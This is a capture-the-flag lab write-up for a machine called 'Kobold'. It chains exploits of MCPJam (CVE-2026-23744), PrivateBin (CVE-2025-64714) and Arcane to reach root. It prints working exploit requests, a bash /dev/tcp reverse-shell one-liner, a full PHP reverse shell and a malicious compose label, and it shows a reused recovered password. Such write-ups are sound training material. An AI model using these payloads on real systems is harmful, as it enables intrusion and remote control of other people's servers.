# Kobold

**Target IP:** `10.129.245.50`  
**Hostname:** `target.htb`  
**Platform:** `Linux`  
**Difficulty:** `Easy`

---

## 1. Enumeration

### Port Scan

```
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
443/tcp   open  https
```

So we seem to have the classic ssh + http, except with the added https seemingly, this is likely as it is some form of proprietary software.

### Web Reconnaissance

Viewing the app on both ports, we get the same web page. In fact the http redirects to https. The web server seems to be a management platform for AI powered agents and containerized applications. 

![[Pasted image 20260326000907.png]]

We also find an email at the bottom of the page - `admin@kobold.htb`. Other than this, there are no clickable links.

Directory fuzzing:

```bash
feroxbuster --url http://kobold.htb/
```

I also scan the https version:
```bash
feroxbuster --url https://kobold.htb/ --insecure
```

This returns nothing at all on either scans:
![[Pasted image 20260326001153.png]]

Subdomain / vhost enumeration:

```bash
ffuf -c -u http://10.129.245.50 -H "Host: FUZZ.kobold.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -fc 301
```

This returns no subdomains, however, scanning the https version returns otherwise:
```bash
ffuf -c -u https://10.129.245.50 -H "Host: FUZZ.kobold.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -fc 301
```

This finds mcp and bin as subdomains:
![[Pasted image 20260326002432.png]]

### bin.kobold.htb

Viewing this page, it appears to be a "private" version of pastebin called PrivateBin. This is running version 2.0.2. There is a small section explaining that the server has no knowledge of the stored info as it is stored encrypted in the browser (perhaps local storage.)
![[Pasted image 20260326001707.png]]

Performing a quick google search actually finds that version 2.0.2 was provided as a fix to an HTML injection, and doesn't appear to have any CVEs
### mcp.kobold.htb

Viewing this subdomain, it appears to be running a piece of software called MCPJam, which seems to be a form of management software for AI agents. Navigating to the settings we can see this is running version 1.4.2:
![[Pasted image 20260326001942.png]]

Performing a google search for this returns that it is vulnerable to RCE via CVE-2026-23744, a new and relevant CVE which makes me think this is the way forward.

---

## 2. Initial Foothold — CVE-2026-23744

This is a vulnerability in MCPJam which allows an attacker to send a crafted HTTP request, triggering the installation of an MCP server and RCE. This is because by default MCPJam runs on 0.0.0.0 instead of 127.0.0.1 and can be accessed externally. 

**Reference / PoC:** https://github.com/MCPJam/inspector/security/advisories/GHSA-232v-j27c-5pp6

### Exploitation

Reading through the advisory, it seems to show you can execute commands using the following:
```bash
curl http://10.97.58.83:6274/api/mcp/connect --header "Content-Type: application/json" --data "{\"serverConfig\":{\"command\":\"cmd.exe\",\"args\":[\"/c\", \"calc\"],\"env\":{}},\"serverId\":\"mytest\"}"
```

If we modify this to curl our local server, we can test if this works:

```bash
curl https://mcp.kobold.htb/api/mcp/connect --header "Content-Type: application/json" --data "{\"serverConfig\":{\"command\":\"cmd.exe\",\"args\":[\"/c\", \"curl\", \"10.10.14.2\"],\"env\":{}},\"serverId\":\"mytest\"}"
```

I initially got an error as the curl complains about the cert, i add -k to allow insecure, the request seems to work but not spawn the cmd.exe for some reason (I also do not get a callback):
![[Pasted image 20260326002637.png]]

I took a short pause on this box for a while and upon reflection realised this was a linux box and so the command needs to be modified to reflect this:

```bash
curl https://mcp.kobold.htb/api/mcp/connect --header "Content-Type: application/json" --data "{\"serverConfig\":{\"command\":\"/bin/bash\",\"args\":[\"-c\", \"ping\", \"10.10.14.2\"],\"env\":{}},\"serverId\":\"mytest\"}" -k
```

This also doesn't get a callback so I instead just attempt to get a reverse shell, as its possible curl might not be on the box. I set up a penelope listener to handle this.

Obtain a reverse shell:

```bash
curl https://mcp.kobold.htb/api/mcp/connect --header "Content-Type: application/json" --data "{\"serverConfig\":{\"command\":\"/bin/bash\",\"args\":[\"-c\", \"/bin/bash\", \"-i\", \">&\", \"/dev/tcp/10.10.14.2/4444\", \"0>&1\"],\"env\":{}},\"serverId\":\"mytest\"}" -k
```

I initially get nothing on this, but modify the arguments to contain the entire shell, as this should be entered as a second argument:

```bash
curl https://mcp.kobold.htb/api/mcp/connect --header "Content-Type: application/json" --data "{\"serverConfig\":{\"command\":\"/bin/bash\",\"args\":[\"-c\", \"/bin/bash -i >& /dev/tcp/10.10.14.2/4444 0>&1\"],\"env\":{}},\"serverId\":\"mytest\"}" -k
```

Using this I got a shell as ben and the user flag:
![[Pasted image 20260329183100.png]]

---

## 3. Post foothold enumeration 

After getting a shell on the box as ben, we obviously can't run `sudo -l` as we don't have a password. In the home directory, there appears to be another user `alice` which may be our next target.

### PrivateBin

In the root directory, there appears to be a folder named `privatebin-data`, this is unusual and probably could do with some further investigation.

In here we find a folder `data` which is writable by the group `operator` which we are part of:

![[Pasted image 20260329184004.png]]

Inside this `/data` folder appears to be some php files, suggesting these might be the files relating to the server. On `bin.kobold.htb` we had an instance of PrivateBin, so my suspected exploit path is to use the writable folder and our web access to exploit something.
### CVE-2025-64714

Going back to privatebin and the version number (`2.0.2`) I was able to find it has a low risk vulnerability leading to unauthenticated LFI - CVE-2025-64714. In this exploit, it seems that the user can add a `template` cookie which references a php file. If this php file is hosted on the server already, it can lead to RCE. In our case we can simply write a reverse shell php to the `data` folder and then exploit this in the web page.
## 4. LFI > RCE (CVE-2025-64714)

**Reference / PoC:** https://github.com/PrivateBin/PrivateBin/security/advisories/GHSA-g2j9-g8r5-rg82

Reading this PoC, it seems we need to perform some directory traversal inside the `template` cookie. It appears that if we use **salt** as a test, it will error / not display if vulnerable. We confirm this as follows:
![[Pasted image 20260329185529.png]]

Now  we need to write our malicious shell to the server:
```bash
nano test.php
```

And i insert an example payload from revshells.com:
```php
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net

set_time_limit (0);
$VERSION = "1.0";
$ip = '10.10.14.2';
$port = 4444;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/bash -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

chdir("/");

umask(0);

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?>
```

Now we include this as our template variable:
![[Pasted image 20260329185809.png]]

Interesting this seems to open a shell and then the shell dies.

Instead of using penelope, I spin up a netcat listener to get a better idea of whats going on:
![[Pasted image 20260329190012.png]]

This seems to show that /bin/bash is not found, but /bin/sh is. By modifying our `test.php` to use `/bin/sh` we can rerun this exploit and get a shell as `nobody`:
![[Pasted image 20260329190234.png]]

This appears to be in a docker container, and we have almost no permissions, so this might be a dead end. We confirm this is a docker container by the entry in `/etc/hosts`:
![[Pasted image 20260329190404.png]]

In the root directory of the container there is a folder `srv` which I suspect holds some of the server files and may contain config files. In `/srv/cfg` I find `conf.php` which is a very long config file:
![[Pasted image 20260329191001.png]]

As the config file is so long, I paste it into an AI agent to parse and summarise for me. In a real engagement this would be inappropriate as it could leak sensitive info, but in a CTF context this is fine. 

It identifies some MySQL creds, however notes that local storage is used NOT MySQL:
- Host: `localhost`, DB: `privatebin`, User: `privatebin`
- Password: `ComplexP@sswordAdmin1928`

### Credential reuse
From my perspective it is weird that there is a MySQL password present when it is disabled, so my thought is this might be a case of credential reuse. I attempt the password in many many places, such as for the `alice` user and many other default usernames via password spraying. There is no option to login to any of the web pages.

With a small hint, I return to nmap scanning, this time doing a full scan:
![[Pasted image 20260329192317.png]]

This identifies an additional port - 3552, which appears to be running some form of Golang service.

Visiting this page we get a login screen for an application called **Arcane**, with a version number of **1.13.0**:
![[Pasted image 20260329192523.png]]

A quick search returns the default username is `arcane`, combining this with the password we found earlier logs us in.

---

## 5. Arcane RCE — CVE-2026-23520

Performing a search for Arcane 1.13.0 exploits returns CVE-2026-23520, an RCE allowing an authenticated attacker to create a project and define a lifecycle label with a malicious comment.

**Reference / PoC:** https://github.com/advisories/GHSA-gjqq-6r35-w3r8

In the advisory there is an interesting line stating:
`This can enable data theft and, in some configurations, escalation to full host compromise (for example, if /var/run/docker.sock is mounted).` This might be our path to root.
### Testing the exploit

According to the advisory, the `pre-update` or `post-update` label is based directly to `/bin/sh -c` without any sanitization or validation. Apparently we can create a project through the api with these labels to execute commands.

We need to find a valid image we can use:
![[Pasted image 20260329194212.png]]

I edit the compose.yaml by adding a pre-update label:

```yaml
services:
  nginx:
    image: privatebin/nginx-fpm-alpine:2.0.2
    container_name: nginx_service
    env_file:
      - .env
    ports:
      - "8080:80"
    volumes:
      - nginx_data:/usr/share/nginx/html
    restart: unless-stopped
    labels:
      com.getarcaneapp.arcane.lifecycle.pre-update: "/bin/sh -i >& /dev/tcp/10.10.14.2/4444 0>&1"

volumes:
  nginx_data:
    driver: local
```

This does not seem to work as the project attempts to call out to an external docker.io site and fails. 

At this stage I hunt around a bit more on the site and discover we can make containers with a command to run when executed:
![[Pasted image 20260329194538.png]]

If we add our reverse shell payload in here and create it. I also add the working directory as /root and the user as root:
![[Pasted image 20260329194705.png]]

I attempted this but got no shell, I suspect the docker containers created aren't externally network connected so I can't callback to my host.

By playing around I discovered if I set the user to root, I can use the "Volumes" tab to mount the host filesystem into /host in the container:
![[Pasted image 20260329195653.png]]

And then interact with this via the web browser shell to get the root flag:
![[Pasted image 20260329195738.png]]

---

## Summary

| Step                 | Technique                                                                                                                                                                                            |
| -------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Initial access       | CVE-2026-23744 — MCPJam exposed on 0.0.0.0 allows unauthenticated RCE via crafted HTTP request to `/api/mcp/connect`; reverse shell obtained as ben                                                  |
| Credential access    | CVE-2025-64714 — PrivateBin LFI via `template` cookie used to execute a PHP reverse shell in a container; MySQL password recovered from `conf.php` and reused to authenticate to Arcane on port 3552 |
| User shell           | Arcane default credentials (`arcane` / recovered password) grant access; host filesystem mounted into container via Volumes tab, exposing root flag                                                  |
| Privilege escalation | No traditional privesc — root flag accessed directly by mounting the host filesystem (`/`) into a container as root via Arcane's volume management                                                   |